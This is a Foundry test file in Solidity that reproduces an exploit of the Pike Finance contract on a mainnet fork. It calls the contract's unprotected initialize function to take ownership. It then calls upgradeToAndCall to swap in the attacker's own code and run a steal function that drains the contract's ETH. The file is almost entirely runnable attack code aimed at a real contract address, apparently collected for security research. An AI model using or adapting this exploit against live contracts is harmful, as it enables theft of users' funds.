// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface PikeFinanceInterface {
    function initialize(address, address, address, address, uint16, uint16) external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract PikeFinanceExploit is Test {
    uint256 forkBlockNum = 19771058;
    address PikeFinance = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    function setUp() public {
        vm.deal(address(this), 0);
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), forkBlockNum);
    }

    function testPoC() public {
        console.log("Start Pike Finance Exploit PoC");
        console.log("Contract Balance : ", address(this).balance);
        console.log("Pike Finance Balance : ", address(PikeFinance).balance);
        console.log();

        address owner = address(this);
        address WNativeAddress = address(this);
        address uniswapHelperAddress = address(this);
        address tokenAddress = address(this);

        console.log("Pike Finance initializing...");
        console.log();
        
        PikeFinanceInterface(PikeFinance).initialize(owner, WNativeAddress, uniswapHelperAddress, tokenAddress, 20, 20);

        console.log("Pike Finance initializing success");
        console.log("Pike Finance upgradeToAndCall...");
        console.log();

        PikeFinanceInterface(PikeFinance).upgradeToAndCall(address(this), abi.encodeWithSignature("steal(address)", address(this)));

        console.log("Pike Finance upgradeToAndCall success");
        console.log();

        console.log("Finish Pike Finance Exploit PoC");
        console.log("Contract Balance : ", address(this).balance);
        console.log("Pike Finance Balance : ", address(PikeFinance).balance);
    }

    function steal(address _address) external {
        payable(_address).call{value: address(this).balance}("");
    }

    function proxiableUUID() external pure returns(bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}